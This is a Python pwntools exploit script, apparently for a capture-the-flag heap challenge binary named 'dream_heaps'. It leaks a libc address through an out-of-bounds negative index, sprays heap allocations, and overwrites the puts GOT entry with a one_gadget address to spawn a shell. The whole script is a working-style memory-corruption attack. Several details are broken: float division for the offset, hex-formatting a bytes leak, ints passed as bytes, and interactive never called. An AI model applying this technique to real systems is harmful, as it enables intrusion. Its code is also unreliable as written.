from pwn import *

def write(target, contents, size):
  print(target.sendlineafter(b'> ', b'1'))
  print(target.sendlineafter(b'dream?', size))
  print(target.sendlineafter(b'dream?', contents))


def read(target, index):
  print(target.sendlineafter(b'> ', b'2'))
  print(target.sendlineafter(b'read?', index))
  dream = target.recvuntil(b'What would you', drop=True)
  return dream


def edit(target, index, contents):
  print(target.sendlineafter(b'> ', b'3'))
  print(target.sendlineafter(b'change?', index))
  target.sendline(contents)


def delete(target, index):
  print(target.sendlineafter(b'> ', b'4'))
  print(target.sendlineafter(b'delete?', index))


def main():
  elf = ELF('./dream_heaps')
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  # elf.get_section_by_name('.rela.plt').get_relocation(6)
  offset = (elf.symbols['HEAP_PTRS'] - 0x4005B0) / 8
  log.info("Offset: " + str(offset))

  target = process('./dream_heaps')
  leak = read(target, str(-offset).encode('utf-8'))
  libc = u64(leak[:6].ljust(8, '\x00'))
  log.info("__libc_start_main@libc: 0x{:x}".format(leak))

  for _ in range(19):
    write(target, 0x8, "A")

  write(target, 0x0, "")
  write(target, int(elf.got['puts']), "")

  one_gadget = 0x45216

  edit(target, b'18', p64(libc + one_gadget))

  target.interactive


if __name__ == '__main__':
  main()

